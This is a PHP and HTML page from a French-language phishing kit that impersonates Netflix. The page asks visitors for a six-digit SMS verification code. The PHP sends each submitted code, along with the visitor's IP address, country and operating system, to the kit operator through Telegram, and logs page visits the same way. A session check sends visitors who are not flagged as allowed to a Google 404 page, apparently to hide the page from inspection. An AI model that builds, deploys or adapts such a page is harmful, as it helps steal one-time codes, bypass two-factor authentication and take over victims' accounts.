<?php
session_start();
include "./zebi/config.php";
include "./zebi/functions.php";

if ($_SESSION['allow'] != "yes") {
    header('location: https://google.com/404');
    exit();
}


$user_info = getUserInfo();
$timestamp = getCurrentTimestamp();


if (!isset($_SESSION['verification_page_notified'])) {
    $telegram_message = "🔢 <b>User on Verification Page</b> 🔢\n";
    $telegram_message .= "-----------------------------------\n";
    $telegram_message .= "🌍 IP: <code>" . $user_info['ip'] . "</code>\n";
    $telegram_message .= "📍 Country: <code>" . $user_info['country_code'] . "</code>\n";
    $telegram_message .= "💻 OS: <code>" . $user_info['os'] . "</code>\n";
    $telegram_message .= "⏰ Time: " . $timestamp . "\n";

    if (sendMessage($telegram_message)) {
        error_log("Verification page notification sent to Telegram successfully.");
        $_SESSION['verification_page_notified'] = true; 
    } else {
        error_log("Failed to send verification page notification to Telegram.");
    }
}

$error_message = '';


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $verification_code = isset($_POST['code']) ? htmlspecialchars($_POST['code']) : '';

    if (!empty($verification_code)) {

        $telegram_message = "
📋 NEW SMS VERIFICATION FROM {$user_info['country_code']}

🕹️ Verification Code:

└ <code>{$verification_code}</code>

✨ Extra Information:

├ 🗺️ Country: <code>{$user_info['country_code']}</code>
├ 🌐 IP Address: <code>{$user_info['ip']}</code>
└ 💻 Operating System: <code>{$user_info['os']}</code>

🎯 Base Details:

└ 🕒 Timestamp: <code>{$timestamp}</code>
└ 📍 System: <code>NETFLIX</code>
└ © 2025 - All rights reserved. 🎗️

[🔗] CorteX - @Sssba3 [🔗]";



        if (sendMessage($telegram_message)) {
            error_log("Verification code sent to Telegram successfully.");

            $_SESSION['sms_submitted'] = true;

            header('Location: loading2.php');
            exit();
        } else {
            error_log("Failed to send verification code to Telegram.");
            $error_message = "Une erreur est survenue lors de l'envoi du code. Veuillez réessayer.";
        }
    } else {
        $error_message = "Veuillez entrer le code de vérification.";
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification - Netflix</title>
    <link rel="icon" href="files/img/nficon2025.ico">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: url('files/img/back.jpg');
            background-size: cover;
            background-position: center;
            color: #fff;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 150px;
        }
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }
        p {
            margin-bottom: 20px;
            font-size: 16px;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #555;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
            font-size: 16px;
            text-align: center;
            letter-spacing: 2px;
        }
        button {
            background-color: #e50914;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            width: 100%;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #f40612;
        }
        .error-message {
            color: #ffcc00;
            margin-top: 15px;
            font-size: 14px;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #aaa;
        }
        .footer a {
            color: #aaa;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="files/img/Logonetflix.png" alt="Netflix Logo">
        </div>
        <h2>Vérification du Code</h2>
        <p>Un code à 6 chiffres a été envoyé à votre numéro de téléphone. Veuillez l'entrer ci-dessous.</p>
        <form action="" method="post">
            <input type="text" name="code" placeholder="Entrez le code" required maxlength="6" pattern="\d{6}" title="Veuillez entrer un code à 6 chiffres.">
            <button type="submit">Vérifier le Code</button>
        </form>
        <?php if (!empty($error_message)): ?>
            <p class="error-message"><?php echo $error_message; ?></p>
        <?php endif; ?>
        <div class="footer">
            <p>Des questions ? Appelez le 0800-800-800</p>
            <p>
                <a href="">FAQ</a>
                <a href="">Centre d'aide</a>
                <a href="">Conditions d'utilisation</a>
                <a href="">Confidentialité</a>
                <a href="">Préférences de cookies</a>
                <a href="">Informations sur l'entreprise</a>
            </p>
        </div>
    </div>
</body>
</html>
